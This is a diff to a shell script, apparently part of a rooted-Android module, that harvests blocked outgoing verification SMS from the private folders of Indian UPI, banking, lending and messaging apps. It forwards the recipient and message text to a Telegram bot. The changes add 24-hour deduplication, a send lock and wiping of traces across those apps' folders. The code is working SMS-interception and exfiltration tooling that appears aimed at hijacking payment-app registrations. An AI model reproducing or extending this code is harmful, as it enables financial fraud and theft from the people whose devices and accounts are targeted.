@@ -610,23 +610,97 @@ purge_junk_outgoing_files() {
   done
 }
 
+# After TG send / dedupe — wipe EVERY copy so last_outgoing spam stop
+# (pehle pending_verify app code_cache me reh jata tha → har loop pe dubara TG)
+wipe_blocked_sources() {
+  rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag \
+        /data/local/tmp/hivirtus_outgoing_blocked.json \
+        /data/local/tmp/hivirtus_pending_verify.json \
+        /data/local/tmp/hivirtus_blocked_outgoing.json \
+        /data/local/tmp/hivirtus_java_tg_queue.flag \
+        /data/local/tmp/hivirtus_tg_payload.json 2>/dev/null
+  # Keep last_outgoing file for menu, but clear body so harvest can't re-forward
+  printf '%s\n' '{"dest":"","body":"","note":"already_forwarded_waiting"}' \
+    > /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
+  chmod 666 /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
+  rm -f "$MODDIR/hivirtus_outgoing_blocked.json" \
+        "$MODDIR/hivirtus_outgoing_blocked.flag" \
+        "$MODDIR/outgoing_blocked.json" \
+        "$MODDIR/hivirtus_pending_verify.json" \
+        "$MODDIR/hivirtus_last_outgoing.json" 2>/dev/null
+  local pkg f dir
+  for pkg in com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp \
+             com.herofincorp.android com.herofincorp.upi \
+             com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm \
+             com.yespay.next com.yesbank.yespay com.fampay.in com.kreditbee.android \
+             com.stashfin.android in.org.npci.upiapp com.myairtelapp com.hdfcbank.payzapp \
+             com.axis.mobile com.upi.axispay \
+             com.google.android.apps.messaging com.samsung.android.messaging \
+             com.android.messaging com.motorola.messaging com.android.mms \
+             com.android.mms.service; do
+    for dir in \
+      "/data/user/0/$pkg/code_cache/hivirtus" \
+      "/data/data/$pkg/code_cache/hivirtus" \
+      "/data/user/0/$pkg/files" \
+      "/data/data/$pkg/files" \
+      "/data/user/0/$pkg/cache" \
+      "/data/data/$pkg/cache"
+    do
+      for f in hivirtus_outgoing_blocked.json hivirtus_outgoing_blocked.flag \
+               hivirtus_pending_verify.json hivirtus_last_outgoing.json \
+               hivirtus_blocked_outgoing.json hivirtus_java_tg_queue.flag; do
+        rm -f "$dir/$f" 2>/dev/null
+      done
+    done
+  done
+}
+
+# True if this To+body already forwarded (24h) — stop last_outgoing spam
+already_forwarded_outgoing() {
+  local dest="$1" body="$2"
+  local dkey prev prev_ts now age
+  dkey=$(printf '%s|%s' "$dest" "$body" | md5sum 2>/dev/null | awk '{print $1}')
+  [ -z "$dkey" ] && dkey=$(printf '%s|%s' "$dest" "$body")
+  prev=$(cat /data/local/tmp/hivirtus_tg_out_dedupe.hash 2>/dev/null | tr -d '\r\n')
+  prev_ts=$(cat /data/local/tmp/hivirtus_tg_out_dedupe.ts 2>/dev/null | tr -d '\r\n')
+  now=$(date +%s)
+  [ -n "$dkey" ] && [ "$dkey" = "$prev" ] && [ -n "$prev_ts" ] || return 1
+  age=$((now - prev_ts))
+  # 24h — same Hero SMS thodi der baad dubara mat bhejo
+  [ "$age" -lt 86400 ] 2>/dev/null
+}
+
 harvest_blocked_outgoing() {
   purge_junk_outgoing_files
   local best="" best_mt=0
+  local dest body digits
   # Prefer UPI apps over Messages — Messages OTP junk was overwriting forever
   for pkg in com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp \
              com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm \
              com.myairtelapp com.yespay.next com.kreditbee.android com.stashfin.android \
-             com.hdfcbank.payzapp com.axis.mobile \
+             com.hdfcbank.payzapp com.axis.mobile com.fampay.in \
              com.google.android.apps.messaging com.samsung.android.messaging \
              com.android.messaging com.android.mms com.motorola.messaging com.android.mms.service; do
     for f in \
       "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
       "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
       "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_pending_verify.json" \
-      "/data/data/$pkg/code_cache/hivirtus/hivirtus_pending_verify.json"
+      "/data/data/$pkg/code_cache/hivirtus/hivirtus_pending_verify.json" \
+      "/data/user/0/$pkg/files/hivirtus_outgoing_blocked.json" \
+      "/data/data/$pkg/files/hivirtus_outgoing_blocked.json" \
+      "/data/user/0/$pkg/files/hivirtus_pending_verify.json" \
+      "/data/data/$pkg/files/hivirtus_pending_verify.json"
     do
       is_valid_outgoing_json "$f" || continue
+      dest=$(grep -o '"dest"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+      body=$(grep -o '"body"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | sed 's/\\n/\n/g;s/\\"/"/g')
+      digits=$(printf '%s' "$dest" | tr -cd '0-9')
+      # Already TG pe gaya — delete so last_outgoing spam band
+      if already_forwarded_outgoing "$digits" "$body"; then
+        rm -f "$f" 2>/dev/null
+        echo "harvest_skip_already_tg $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+        continue
+      fi
       mt=$(stat -c %Y "$f" 2>/dev/null || echo 0)
       if [ -z "$best" ] || [ "$mt" -gt "$best_mt" ]; then
         best="$f"
@@ -638,27 +712,42 @@ harvest_blocked_outgoing() {
     done
     for f in \
       "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag" \
-      "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag"
+      "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag" \
+      "/data/user/0/$pkg/files/hivirtus_outgoing_blocked.flag" \
+      "/data/data/$pkg/files/hivirtus_outgoing_blocked.flag"
     do
       [ -f "$f" ] && [ -s "$f" ] || continue
       grep -qiE 'is your OTP|<#>|Valid for' "$f" 2>/dev/null && { rm -f "$f"; continue; }
+      dest=$(head -n1 "$f" 2>/dev/null | tr -d '\r')
+      body=$(tail -n +2 "$f" 2>/dev/null | tr -d '\r')
+      digits=$(printf '%s' "$dest" | tr -cd '0-9')
+      if already_forwarded_outgoing "$digits" "$body"; then
+        rm -f "$f" 2>/dev/null
+        continue
+      fi
       cp -f "$f" /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null
       chmod 666 /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null
     done
   done
   if [ -n "$best" ]; then
+    # Archive only — NEVER use last_outgoing as TG re-send source
     cp -f "$best" /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
     chmod 666 /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
   fi
   for f in "$MODDIR/hivirtus_outgoing_blocked.json" "$MODDIR/outgoing_blocked.json" \
            "$MODDIR/hivirtus_pending_verify.json"; do
     is_valid_outgoing_json "$f" || continue
+    dest=$(grep -o '"dest"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+    body=$(grep -o '"body"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | sed 's/\\n/\n/g;s/\\"/"/g')
+    digits=$(printf '%s' "$dest" | tr -cd '0-9')
+    if already_forwarded_outgoing "$digits" "$body"; then
+      rm -f "$f" 2>/dev/null
+      continue
+    fi
     case "$f" in
       *pending*) cp -f "$f" /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null ;;
       *.json) cp -f "$f" /data/local/tmp/hivirtus_outgoing_blocked.json 2>/dev/null ;;
     esac
-    cp -f "$f" /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
-    chmod 666 /data/local/tmp/hivirtus_last_outgoing.json 2>/dev/null
   done
 }
 
@@ -850,30 +939,38 @@ forward_blocked_telegram() {
   [ -z "$BLOCKED_BODY" ] && [ -z "$BLOCKED_DEST" ] && return 0
   [ -z "$BLOCKED_BODY" ] && return 0
 
+  # Single-flight — 0.25s + 1s loops double TG avoid
+  if ! mkdir /data/local/tmp/hivirtus_tg_send.lockdir 2>/dev/null; then
+    return 0
+  fi
+
   # Skip incoming OTP noise — any other UPI outgoing is OK (not Hero-only)
   case "$BLOCKED_BODY" in
     *is\ your\ OTP*|*Valid\ for*|"<#>"*|*"Do not share with anyone"*|*UPI\ Registration*)
       echo "tg_skip_incoming_otp $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
-      rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag \
-            /data/local/tmp/hivirtus_outgoing_blocked.json \
-            /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null
+      wipe_blocked_sources
+      rmdir /data/local/tmp/hivirtus_tg_send.lockdir 2>/dev/null
       return 0
       ;;
   esac
   case "$BLOCKED_BODY" in
     com.*|android.*)
       echo "tg_skip_pkg_junk $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+      wipe_blocked_sources
+      rmdir /data/local/tmp/hivirtus_tg_send.lockdir 2>/dev/null
       return 0
       ;;
   esac
   [ ${#BLOCKED_BODY} -ge 4 ] || {
     echo "tg_skip_short_body $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+    rmdir /data/local/tmp/hivirtus_tg_send.lockdir 2>/dev/null
     return 0
   }
   # To must be digits (verify shortcode / number) — never package / OTP text
   TO_DIGITS=$(printf '%s' "$BLOCKED_DEST" | tr -cd '0-9')
   [ ${#TO_DIGITS} -ge 4 ] && [ ${#TO_DIGITS} -le 15 ] || {
     echo "tg_skip_bad_dest $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+    rmdir /data/local/tmp/hivirtus_tg_send.lockdir 2>/dev/null
     return 0
   }
   # All-zero placeholder dest — map to Hero/Axis shortcode if body looks like verify
@@ -888,6 +985,8 @@ forward_blocked_telegram() {
           ;;
         *)
           echo "tg_skip_placeholder_dest $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+          wipe_blocked_sources
+          rmdir /data/local/tmp/hivirtus_tg_send.lockdir 2>/dev/null
           return 0
           ;;
       esac
@@ -895,7 +994,8 @@ forward_blocked_telegram() {
   esac
   BLOCKED_DEST="$TO_DIGITS"
 
-  # Dedupe — same To+body only within 90s (retest after Update allowed)
+  # Dedupe 24h — same last_outgoing thodi der baad dubara mat bhejo
+  # (Menu Save clears hash so naya verify still works)
   DKEY=$(printf '%s|%s' "$BLOCKED_DEST" "$BLOCKED_BODY" | md5sum 2>/dev/null | awk '{print $1}')
   [ -z "$DKEY" ] && DKEY=$(printf '%s|%s' "$BLOCKED_DEST" "$BLOCKED_BODY")
   PREV=$(cat /data/local/tmp/hivirtus_tg_out_dedupe.hash 2>/dev/null | tr -d '\r\n')
@@ -903,11 +1003,10 @@ forward_blocked_telegram() {
   NOW_TS=$(date +%s)
   if [ -n "$DKEY" ] && [ "$DKEY" = "$PREV" ] && [ -n "$PREV_TS" ]; then
     AGE=$((NOW_TS - PREV_TS))
-    if [ "$AGE" -lt 90 ] 2>/dev/null; then
+    if [ "$AGE" -lt 86400 ] 2>/dev/null; then
       echo "tg_dedupe_skip $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
-      rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag \
-            /data/local/tmp/hivirtus_outgoing_blocked.json \
-            /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null
+      wipe_blocked_sources
+      rmdir /data/local/tmp/hivirtus_tg_send.lockdir 2>/dev/null
       return 0
     fi
   fi
@@ -918,17 +1017,30 @@ forward_blocked_telegram() {
     IN_BODY=$(tail -n +2 /data/local/tmp/hivirtus_tg_inproc_sent.flag 2>/dev/null | tr -d '\r')
     IN_DIGITS=$(printf '%s' "$IN_DEST" | tr -cd '0-9')
     if [ "$IN_DIGITS" = "$BLOCKED_DEST" ] && [ "$IN_BODY" = "$BLOCKED_BODY" ]; then
-      rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag \
-            /data/local/tmp/hivirtus_outgoing_blocked.json \
-            /data/local/tmp/hivirtus_pending_verify.json \
-            /data/local/tmp/hivirtus_tg_inproc_sent.flag 2>/dev/null
+      printf '%s\n' "$DKEY" > /data/local/tmp/hivirtus_tg_out_dedupe.hash 2>/dev/null
+      date +%s > /data/local/tmp/hivirtus_tg_out_dedupe.ts 2>/dev/null
+      wipe_blocked_sources
+      rm -f /data/local/tmp/hivirtus_tg_inproc_sent.flag 2>/dev/null
       echo "tg_skip_inproc $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+      rmdir /data/local/tmp/hivirtus_tg_send.lockdir 2>/dev/null
       return 0
     fi
   fi
-  tg_forward_enabled || return 0
+  if ! tg_forward_enabled; then
+    rmdir /data/local/tmp/hivirtus_tg_send.lockdir 2>/dev/null
+    return 0
+  fi
   read_tg_creds
-  [ -z "$TG_TOKEN" ] || [ -z "$TG_CHAT" ] && return 0
+  if [ -z "$TG_TOKEN" ] || [ -z "$TG_CHAT" ]; then
+    rmdir /data/local/tmp/hivirtus_tg_send.lockdir 2>/dev/null
+    return 0
+  fi
+
+  # Claim dedupe BEFORE send — dual loops (0.25s + 1s) double-post avoid
+  printf '%s\n' "$DKEY" > /data/local/tmp/hivirtus_tg_out_dedupe.hash 2>/dev/null
+  date +%s > /data/local/tmp/hivirtus_tg_out_dedupe.ts 2>/dev/null
+  chmod 666 /data/local/tmp/hivirtus_tg_out_dedupe.hash \
+    /data/local/tmp/hivirtus_tg_out_dedupe.ts 2>/dev/null
 
   # Display (+91 for 10-digit Indian)
   TO_NUM="$BLOCKED_DEST"
@@ -940,7 +1052,7 @@ forward_blocked_telegram() {
   [ -z "$TO_NUM" ] && TO_NUM="—"
   MSG_BODY="$BLOCKED_BODY"
 
-  # Screenshot format + one-tap = To + Message
+  # Screenshot format — One-tap ONLY in button, NOT inside message text
   ONE_TAP="To: ${TO_NUM}
 Message: ${MSG_BODY}"
 
@@ -960,31 +1072,17 @@ ${MSG_BODY}"
   RESP="/data/local/tmp/hivirtus_tg_last_response.txt"
   if tg_http_post "$PAYLOAD" "$RESP"; then SENT=1; fi
   if [ "$SENT" = "1" ] && grep -q '"ok"[[:space:]]*:[[:space:]]*true' "$RESP" 2>/dev/null; then
-    printf '%s\n' "$DKEY" > /data/local/tmp/hivirtus_tg_out_dedupe.hash 2>/dev/null
-    date +%s > /data/local/tmp/hivirtus_tg_out_dedupe.ts 2>/dev/null
-    chmod 666 /data/local/tmp/hivirtus_tg_out_dedupe.hash \
-      /data/local/tmp/hivirtus_tg_out_dedupe.ts 2>/dev/null
-    rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag
-    rm -f /data/local/tmp/hivirtus_outgoing_blocked.json
-    rm -f /data/local/tmp/hivirtus_pending_verify.json
-    rm -f "$PAYLOAD"
-    for pkg in com.herofincorp.diyjourneys com.phonepe.app \
-               com.google.android.apps.nbu.paisa.user net.one97.paytm \
-               com.yespay.next com.fampay.in com.kreditbee.android \
-               com.stashfin.android in.org.npci.upiapp \
-               com.google.android.apps.messaging; do
-      rm -f "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
-            "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag" \
-            "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
-            "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag" 2>/dev/null
-    done
-    rm -f "$MODDIR/hivirtus_outgoing_blocked.json" "$MODDIR/hivirtus_outgoing_blocked.flag" 2>/dev/null
+    wipe_blocked_sources
     echo "tg_ok $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
     chmod 644 /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
   else
+    # Send fail — allow retry: clear claim so next loop can try again
+    rm -f /data/local/tmp/hivirtus_tg_out_dedupe.hash \
+          /data/local/tmp/hivirtus_tg_out_dedupe.ts 2>/dev/null
     echo "tg_fail $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
     chmod 644 /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
   fi
+  rmdir /data/local/tmp/hivirtus_tg_send.lockdir 2>/dev/null
 }
 
 seed_hooked_pkgs() { return 0; }
